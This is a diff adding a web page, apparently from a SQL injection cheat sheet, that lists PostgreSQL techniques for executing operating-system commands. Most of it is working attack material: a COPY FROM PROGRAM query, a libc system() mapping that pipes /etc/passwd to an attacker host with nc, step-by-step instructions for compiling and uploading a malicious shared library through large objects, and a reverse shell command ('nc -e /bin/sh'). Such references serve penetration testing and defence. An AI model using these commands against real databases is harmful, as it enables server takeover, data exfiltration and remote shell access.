@@ -1,0 +1,90 @@
+<h3 id="executing-os-commands-through-sql-server">Executing OS Commands Through PostgreSQL</h3>
+
+<p class="pageDescription">{{site.data.injectionDescriptions.executingOSCommands}}</p>
+
+<table class="table table-striped table-hover">
+  <thead>
+    <tr>
+      <th>Name</th>
+      <th>Query</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr >
+      <td valign="top">
+	  <br><br>  
+	  FROM PROGRAM
+	  </td>
+	  <td valign="top">	
+	  <br><br>  
+		DROP TABLE IF EXISTS myoutput;<br>
+		CREATE TABLE myoutput(filename text);<br>
+		COPY myoutput FROM PROGRAM 'ps aux';<br>
+		SELECT * FROM myoutput ORDER BY filename ASC;<br>
+      </td>
+    </tr>
+    <tr>
+      <td valign="top">
+	  <br><br>  
+	  Create PostgreSQL Function Mapped &nbsp;<br> 
+	  to Libc System Method
+	  </td>
+	  <td valign="top">	
+	  <br><br>  
+	  		CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;<br>
+		SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');<br>
+		<br>
+		Notes:
+		<br>
+		This method works with PostgreSQL 8.1 and below.  After version 9, you'll have to upload your own library with the "PG_MODULE_MAGIC" set.<br> 
+		The process for this is outlined at https://www.dionach.com/blog/postgresql-9x-remote-command-execution, below is a summary.
+		<br><br>
+		
+		1. To get the version from the PostgreSQL server use the query below.
+		<br><br>
+		SELECT version();
+		<br><br>
+		   		   
+		2. To compile the library, a Linux machine with the same version of PostgreSQL as the target machine is required. Below is an example showing how to install PostgreSQL. 
+		<br><br>
+		apt install postgresql postgresql-server-dev-9.6
+		<br><br>
+		
+		3. Download pgexec file from https://github.com/Dionach/pgexec/tree/master.
+		<br><br>
+		
+		4. Compile pgexec with the command below.
+		<br><br>
+		gcc -I$(/usr/local/pgsql/bin/pg_config --includedir-server) -shared -fPIC -o pg_exec.so pg_exec.c<br>
+		<br>
+		
+		5. Upload the library to the target system.  First split the file into pieces. 
+		<br><br>
+		split -b 2048 pg_exec.so
+		<br><br>
+		
+		6.  The file can then be written to disk through PostgreSQL using the commands below.
+		<br><br>
+		SELECT lo_creat(-1);<br>
+		set c0 `base64 -w 0 xaa`<br>
+		INSERT INTO pg_largeobject (loid, pageno, data) values (16388, 0, decode(:'c0', 'base64'));<br>
+
+		<br>
+		Then repeat for each piece of the file.
+		<br><br>
+		7. Create the function.
+		<br><br>
+		CREATE FUNCTION sys(cstring) RETURNS int AS '/tmp/pg_exec.so', 'pg_exec' LANGUAGE 'c' STRICT;
+		<br><br>		
+		8. Send a reverse shell to your system.
+		<br><br>
+		SELECT sys('nc -e /bin/sh 10.0.0.1 4444');
+		<Br><Br>
+		
+		Source: https://www.dionach.com/blog/postgresql-9x-remote-command-execution
+      </td>
+    </tr>	
+  </tbody>
+</table>
+
+
